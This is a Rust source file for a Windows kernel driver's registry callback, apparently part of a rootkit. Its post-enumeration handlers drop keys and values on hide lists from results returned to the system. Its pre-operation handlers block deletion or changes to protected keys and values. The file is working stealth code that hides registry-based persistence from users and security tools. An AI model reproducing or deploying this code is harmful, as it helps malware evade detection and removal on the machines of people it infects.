#![allow(non_upper_case_globals)]

use crate::alloc::string::ToString;
use crate::{
    registry::{
        Registry,
        utils::{check_key, enumerate_key},
    },
    utils::{pool::PoolMemory, valid_kernel_memory},
};
use alloc::collections::BTreeMap;
use alloc::{format, string::String};
use core::ptr::addr_of_mut;
use core::sync::atomic::{AtomicU64, Ordering};
use core::{ffi::c_void, ptr::null_mut};
use spin::Mutex;
use wdk::println;
use wdk_sys::_REG_NOTIFY_CLASS::*;
use wdk_sys::ntddk::*;
use wdk_sys::{_MODE::KernelMode, *};

use super::{
    HIDE_KEY_VALUES, HIDE_KEYS, PROTECTION_KEY_VALUES, PROTECTION_KEYS,
    utils::{RegistryInfo, check_key_value, enumerate_value_key},
};

/// Handle for Registry Callback.
pub static mut CALLBACK_REGISTRY: LARGE_INTEGER = unsafe { core::mem::zeroed() };
static KEY_LOG_CACHE: Mutex<BTreeMap<String, (u64, u64)>> = Mutex::new(BTreeMap::new());
// A counter to trigger cache flush after a certain number of updates.
static UPDATE_COUNT: AtomicU64 = AtomicU64::new(0);
const FLUSH_THRESHOLD: u64 = 20; // flush cache every 20 updates
fn update_key_log_cache(key: &str, reg_path: *const UNICODE_STRING) {
    let addr = reg_path as u64;
    let mut cache = KEY_LOG_CACHE.lock();
    if let Some((min, max)) = cache.get_mut(key) {
        if addr < *min {
            *min = addr;
        }
        if addr > *max {
            *max = addr;
        }
    } else {
        cache.insert(key.to_string(), (addr, addr));
    }
}

/// Flush the cache: log one consolidated message per key and clear the cache.
fn flush_key_log_cache() {
    let mut cache = KEY_LOG_CACHE.lock();
    for (key, (min, max)) in cache.iter() {
        log::info!(
            "read_key: Retrieved key name '{}' from reg_path range: 0x{:X} - 0x{:X}",
            key,
            min,
            max
        );
    }
    cache.clear();
}

/// Update the cache and flush if the update count exceeds the threshold.
fn update_and_maybe_flush(key: &str, reg_path: *const UNICODE_STRING) {
    update_key_log_cache(key, reg_path);
    let count = UPDATE_COUNT.fetch_add(1, Ordering::Relaxed) + 1;
    if count >= FLUSH_THRESHOLD {
        flush_key_log_cache();
        UPDATE_COUNT.store(0, Ordering::Relaxed);
    }
}
/// The registry callback function handles registry-related operations based on the notification class.
///
/// # Arguments
///
/// * `_callback_context` - A pointer to the callback context, usually not used.
/// * `argument1` - A pointer to the notification class.
/// * `argument2` - A pointer to the information related to the registry operation.
///
/// # Returns
///
/// * A status code indicating the result of the operation.
pub unsafe extern "C" fn registry_callback(
    _callback_context: *mut c_void,
    argument1: *mut c_void,
    argument2: *mut c_void,
) -> NTSTATUS {
    let reg_notify_class = argument1 as i32;
    let status = match reg_notify_class {
        RegNtPreSetValueKey => pre_set_value_key(argument2 as *mut REG_SET_VALUE_KEY_INFORMATION),
        RegNtPreDeleteValueKey => {
            pre_delete_value_key(argument2 as *mut REG_DELETE_VALUE_KEY_INFORMATION)
        }
        RegNtPreDeleteKey => pre_delete_key(argument2 as *mut REG_DELETE_KEY_INFORMATION),
        RegNtPreQueryKey => pre_query_key(argument2 as *mut REG_QUERY_KEY_INFORMATION),
        RegNtPostEnumerateKey => {
            post_enumerate_key(argument2 as *mut REG_POST_OPERATION_INFORMATION)
        }
        RegNtPostEnumerateValueKey => {
            post_enumerate_key_value(argument2 as *mut REG_POST_OPERATION_INFORMATION)
        }
        _ => STATUS_SUCCESS,
    };

    status
}

/// Handles the pre-delete key operation.
///
/// # Arguments
///
/// * `info` - A pointer to `REG_DELETE_KEY_INFORMATION`.
///
/// # Returns
///
/// * A status code indicating success or failure.
unsafe fn pre_delete_key(info: *mut REG_DELETE_KEY_INFORMATION) -> NTSTATUS {
    if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
        return STATUS_SUCCESS;
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => {
            log::error!("pre_delete_key: Failed to read key: error {}", err);
            return err;
        }
    };

    log::info!("pre_delete_key: Checking key '{}'", key);
    let status = if Registry::check_key(key.clone(), PROTECTION_KEYS.lock()) {
        log::warn!("pre_delete_key: Access denied for key '{}'", key);
        STATUS_ACCESS_DENIED
    } else {
        STATUS_SUCCESS
    };

    log::info!("pre_delete_key: Returning status: {}", status);
    status
}

/// Performs the post-operation to enumerate registry key values.
///
/// # Arguments
///
/// * `info` - Pointer to the information structure of the post-execution logging operation.
///
/// # Returns
///
/// * Returns the status of the operation. If the key value is found and handled correctly, returns `STATUS_SUCCESS`.
unsafe fn post_enumerate_key_value(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTATUS {
    if !NT_SUCCESS((*info).Status) {
        return (*info).Status;
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => return err,
    };

    if !check_key_value(info, key.clone()) {
        return STATUS_SUCCESS;
    }

    let pre_info =
        match ((*info).PreInformation as *mut REG_ENUMERATE_VALUE_KEY_INFORMATION).as_ref() {
            Some(pre_info) => pre_info,
            None => return STATUS_SUCCESS,
        };

    let mut key_handle = null_mut();
    let status = ObOpenObjectByPointer(
        (*info).Object,
        OBJ_KERNEL_HANDLE,
        null_mut(),
        KEY_ALL_ACCESS,
        *CmKeyObjectType,
        KernelMode as i8,
        &mut key_handle,
    );

    if !NT_SUCCESS(status) {
        println!("ObOpenObjectByPointer Failed With Status: {status}");
        return STATUS_SUCCESS;
    }

    let buffer = match PoolMemory::new(POOL_FLAG_NON_PAGED, (*pre_info).Length as u64, "jdrf") {
        Some(mem) => mem.ptr as *mut u8,
        None => {
            println!("PoolMemory (Enumerate Key) Failed");
            ZwClose(key_handle);
            return STATUS_SUCCESS;
        }
    };

    let mut result_length = 0;
    let mut counter = 0;

    while let Some(value_name) = enumerate_value_key(
        key_handle,
        pre_info.Index + counter,
        buffer,
        (*pre_info).Length,
        (*pre_info).KeyValueInformationClass,
        &mut result_length,
    ) {
        if !Registry::check_target(key.clone(), value_name.clone(), HIDE_KEY_VALUES.lock()) {
            if let Some(pre_info_key_info) = (pre_info.KeyValueInformation as *mut c_void).as_mut()
            {
                *(*pre_info).ResultLength = result_length;
                core::ptr::copy_nonoverlapping(
                    buffer,
                    pre_info_key_info as *mut _ as *mut u8,
                    result_length as usize,
                );
                break;
            } else {
                println!("Failed to copy key information.");
                break;
            }
        } else {
            counter += 1;
        }
    }

    ZwClose(key_handle);
    STATUS_SUCCESS
}
/// Performs the post-operation to enumerate registry keys.
///
/// # Arguments
///
/// * `info` - Pointer to the information structure of the post-execution logging operation.
///
/// # Returns
///
/// * Returns the status of the operation, keeping the original status if the previous operation failed.
unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTATUS {
    if !NT_SUCCESS((*info).Status) {
        return (*info).Status;
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => return err,
    };

    if !check_key(info, key.clone()) {
        return STATUS_SUCCESS;
    }

    let pre_info = match ((*info).PreInformation as *mut REG_ENUMERATE_KEY_INFORMATION).as_ref() {
        Some(pre_info) => pre_info,
        None => return STATUS_SUCCESS,
    };

    let mut key_handle = null_mut();
    let status = ObOpenObjectByPointer(
        (*info).Object,
        OBJ_KERNEL_HANDLE,
        null_mut(),
        KEY_ALL_ACCESS,
        *CmKeyObjectType,
        KernelMode as i8,
        &mut key_handle,
    );

    if !NT_SUCCESS(status) {
        println!("ObOpenObjectByPointer Failed With Status: {status}");
        return STATUS_SUCCESS;
    }

    let buffer = match PoolMemory::new(POOL_FLAG_NON_PAGED, (*pre_info).Length as u64, "jdrf") {
        Some(mem) => mem.ptr as *mut u8,
        None => {
            println!("PoolMemory (Enumerate Key) Failed");
            ZwClose(key_handle);
            return STATUS_SUCCESS;
        }
    };

    let mut result_length = 0;
    let mut counter = 0;
    while let Some(key_name) = enumerate_key(
        key_handle,
        pre_info.Index + counter,
        buffer,
        (*pre_info).Length,
        (*pre_info).KeyInformationClass,
        &mut result_length,
    ) {
        let combined_key = format!("{}\\{}", key, key_name);
        if !Registry::check_key(combined_key.clone(), HIDE_KEYS.lock()) {
            if let Some(pre_info_key_info) = (pre_info.KeyInformation as *mut c_void).as_mut() {
                *(*pre_info).ResultLength = result_length;
                core::ptr::copy_nonoverlapping(
                    buffer,
                    pre_info_key_info as *mut _ as *mut u8,
                    result_length as usize,
                );
                break;
            } else {
                println!("Failed to copy key information.");
                break;
            }
        } else {
            log::info!("post_enumerate_key: Skipping hidden key '{}'", combined_key);
            counter += 1;
        }
    }

    ZwClose(key_handle);
    STATUS_SUCCESS
}

/// Handles the pre-query key operation.
///
/// # Arguments
///
/// * `info` - A pointer to `REG_QUERY_KEY_INFORMATION`.
///
/// # Returns
///
/// * A status code indicating success or failure.
unsafe fn pre_query_key(info: *mut REG_QUERY_KEY_INFORMATION) -> NTSTATUS {
    if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
        return STATUS_SUCCESS;
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => {
            log::error!("pre_query_key: Failed to read key: error {}", err);
            return err;
        }
    };
    log::info!("pre_query_key: Read key '{}'", key);

    // Here you might perform additional checks if needed.
    let status = STATUS_SUCCESS;
    log::info!("pre_query_key: Returning status: {}", status);
    status
}

/// Handles the pre-delete value key operation.
///
/// # Arguments
///
/// * `info` - A pointer to `REG_DELETE_VALUE_KEY_INFORMATION`.
///
/// # Returns
///
/// * A status code indicating success or failure.
unsafe fn pre_delete_value_key(info: *mut REG_DELETE_VALUE_KEY_INFORMATION) -> NTSTATUS {
    if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
        return STATUS_SUCCESS;
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => {
            log::error!("pre_delete_value_key: Failed to read key: error {}", err);
            return err;
        }
    };

    let value_name = (*info).ValueName;
    if value_name.is_null()
        || (*value_name).Buffer.is_null()
        || (*value_name).Length == 0
        || !valid_kernel_memory((*value_name).Buffer as u64)
    {
        log::info!("pre_delete_value_key: Invalid value name pointer or length.");
        return STATUS_SUCCESS;
    }

    let buffer =
        core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
    let name = String::from_utf16_lossy(buffer);

    if Registry::<(String, String)>::check_target(
        key.clone(),
        name.clone(),
        PROTECTION_KEY_VALUES.lock(),
    ) {
        log::warn!(
            "pre_delete_value_key: Access denied for key '{}' value '{}'",
            key,
            name
        );
        STATUS_ACCESS_DENIED
    } else {
        STATUS_SUCCESS
    }
}

/// Handles the pre-set value key operation.
///
/// # Arguments
///
/// * `info` - A pointer to `REG_SET_VALUE_KEY_INFORMATION`.
///
/// # Returns
///
/// * A status code indicating success or failure.
unsafe fn pre_set_value_key(info: *mut REG_SET_VALUE_KEY_INFORMATION) -> NTSTATUS {
    if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
        return STATUS_SUCCESS;
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => {
            log::error!("pre_set_value_key: Failed to read key: error {}", err);
            return err;
        }
    };

    let value_name = (*info).ValueName;
    if value_name.is_null()
        || (*value_name).Buffer.is_null()
        || (*value_name).Length == 0
        || !valid_kernel_memory((*value_name).Buffer as u64)
    {
        log::info!("pre_set_value_key: Invalid value name pointer or length.");
        return STATUS_SUCCESS;
    }

    let buffer =
        core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
    let name = String::from_utf16_lossy(buffer);

    if Registry::check_target(key.clone(), name.clone(), PROTECTION_KEY_VALUES.lock()) {
        log::warn!(
            "pre_set_value_key: Access denied for key '{}' value '{}'",
            key,
            name
        );
        STATUS_ACCESS_DENIED
    } else {
        STATUS_SUCCESS
    }
}

/// Reads the key name from the registry information.
///
/// # Arguments
///
/// * `info` - A pointer to the registry information.
///
/// # Returns
///
/// * `Ok(String)` - The key name.
/// * `Err(NTSTATUS)` - error status.
pub unsafe fn read_key<T: RegistryInfo>(info: *mut T) -> Result<String, NTSTATUS> {
    let object_ptr = (*info).get_object();

    let mut reg_path = core::ptr::null::<UNICODE_STRING>();
    let status = CmCallbackGetKeyObjectIDEx(
        addr_of_mut!(CALLBACK_REGISTRY),
        object_ptr,
        null_mut(),
        &mut reg_path,
        0,
    );

    if !NT_SUCCESS(status) {
        log::error!(
            "read_key: CmCallbackGetKeyObjectIDEx failed with status: {} for object pointer: {:?}",
            status,
            object_ptr
        );
        return Err(status);
    }

    if reg_path.is_null() {
        log::error!(
            "read_key: reg_path is null for object pointer: {:?}",
            object_ptr
        );
        return Err(STATUS_UNSUCCESSFUL);
    }

    let buffer = (*reg_path).Buffer;
    let length = (*reg_path).Length;

    if buffer.is_null() || length == 0 {
        log::error!(
            "read_key: Invalid reg_path returned. reg_path: {:?}, Buffer: {:?}, Length: {}",
            reg_path,
            buffer,
            length
        );
        CmCallbackReleaseKeyObjectIDEx(reg_path);
        return Err(STATUS_UNSUCCESSFUL);
    }

    // Note: the Length field is in bytes; we divide by 2 for wide characters.
    let key_slice = core::slice::from_raw_parts(buffer, (length / 2) as usize);
    let key_name = String::from_utf16_lossy(key_slice);

    // Instead of logging each duplicate message, update the cache.
    update_and_maybe_flush(&key_name, reg_path);

    CmCallbackReleaseKeyObjectIDEx(reg_path);
    Ok(key_name)
}
